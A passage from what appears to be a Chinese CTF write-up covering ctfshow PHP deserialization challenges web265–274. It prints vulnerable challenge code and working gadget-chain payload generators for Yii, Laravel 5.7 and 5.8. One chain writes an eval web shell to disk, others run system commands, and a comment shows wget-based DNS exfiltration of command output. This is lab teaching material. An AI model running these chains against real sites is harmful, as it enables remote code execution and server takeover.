class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要用到一个知识点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=&amp;<span class="variable">$b</span></span><br><span class="line"><span class="comment">//指b的值随a值发生变化，只要a变，b就跟着变。</span></span><br></pre></td></tr></table></figure><p>通过分析可以看出，只要在token和password一直保持相等，就可以得到flag<br>创造脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接的到flag。</p><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br></pre></td></tr></table></figure><p>看到题后发现本题将ctfshow过滤，可以判断需要绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>看到大佬博客发现PHP对类的命名不区分大小写，因次绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> CTFshow());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(<span class="string">&#x27;php://input&#x27;</span>)</span><br><span class="line"><span class="comment">//该函数可以进行如同post一样的参数，因此直接抓包。在包中传参。</span></span><br><span class="line"><span class="comment">//他与post并不相同，具体的不同看博客</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_30950237/article/details/99639508?ops_request_misc=&request_id=&biz_id=102&utm_term=file_get_contents(%27php://input&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-99639508.pc_search_all_es&spm=1018.2226.3001.4187">file_get_contents(‘php://input’) 和POST的区别</a></p><h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>先进行弱口令登录到页面，观察到源码中有?view-source<br>之后在url添加<br>?r=backdoor/shell&amp;code=xxxxx;<br>之后在源码发现该构架为yii，可以想到yii反序列化漏洞<br>用网上通用的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-03 21:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-04 01:10:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id =  <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;;phpinfo()&#x27; &gt; /var/www/html/basic/web/1.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码跑完之后，便可以看是否有1.php存在，在1.php中操作。<br>（有一点需要了解：在测试的过程中需要用到dnslog.site这个网址。<br>用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wget `xx`.二级域名</span></span><br></pre></td></tr></table></figure><p>不懂可以看bili上师傅讲解。<br><a href="https://www.bilibili.com/video/BV1D64y1m78f?p=14">wp视频</a></p><h2 id="web-268-270"><a href="#web-268-270" class="headerlink" title="web 268~270"></a>web 268~270</h2><p>当system无法使用可以使用passthru()函数<br>本体用上题链无法使用<br>看大师傅的另外的几条链<br><a href="https://blog.csdn.net/rfrder/article/details/113824239">feng师傅的yii漏洞复现</a></p><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Laravel - A PHP Framework For Web Artisans</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>  Laravel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Taylor Otwell &lt;taylor<span class="doctag">@laravel</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;LARAVEL_START&#x27;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Register The Auto Loader</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Composer provides a convenient, automatically generated class loader for</span></span><br><span class="line"><span class="comment">| our application. We just need to utilize it! We&#x27;ll simply require it</span></span><br><span class="line"><span class="comment">| into the script here so that we don&#x27;t have to worry about manual</span></span><br><span class="line"><span class="comment">| loading any of our classes later on. It feels great to relax.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Turn On The Lights</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| We need to illuminate PHP development, so let us turn on the lights.</span></span><br><span class="line"><span class="comment">| This bootstraps the framework and gets it ready for use, then it</span></span><br><span class="line"><span class="comment">| will load up this application so that we can run it and send</span></span><br><span class="line"><span class="comment">| the responses back to the browser and delight our users.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Run The Application</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Once we have the application, we can handle the incoming request</span></span><br><span class="line"><span class="comment">| through the kernel, and send the associated response back to</span></span><br><span class="line"><span class="comment">| the client&#x27;s browser allowing them to enjoy the creative</span></span><br><span class="line"><span class="comment">| and wonderful application we have prepared for them.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;handle(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span>-&gt;terminate(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br></pre></td></tr></table></figure><p>通过题目可以看到框架为 Laravel框架，<br>留传具有反序列化的这类框架有Laravel5.7和Laravel5.8.<br>看feng师傅博客<a href="https://blog.csdn.net/rfrder/article/details/113826483">5.7反序列化漏洞复现</a><br>通过poc链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters[]=<span class="string">&quot;cat /fl*&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=<span class="keyword">new</span> GenericUser();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=<span class="keyword">new</span> Application();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span>=&gt;<span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PendingCommand()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web272-273"><a href="#web272-273" class="headerlink" title="web272~273"></a>web272~273</h2><p>上一题是laravel5.7，这一题是laravel5.8反序列化漏洞。<br>看feng师傅博客<br><a href="https://blog.csdn.net/rfrder/article/details/113835057">laravel5.8 反序列化漏洞复现</a><br>看师傅写的poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=<span class="keyword">new</span> Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event=<span class="keyword">new</span> QueuedCommand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>=&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>=&quot;<span class="title">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PendingBroadcast()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p><img src="https://img-blog.csdnimg.cn/86016933291847abbcc97fac63214898.png"><br>进入主页看到源码发现输入点，<br>看feng师傅博客<br><a href="https://blog.csdn.net/rfrder/article/details/113843768">thinkphp反序列化漏洞</a><br>feng师傅的poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 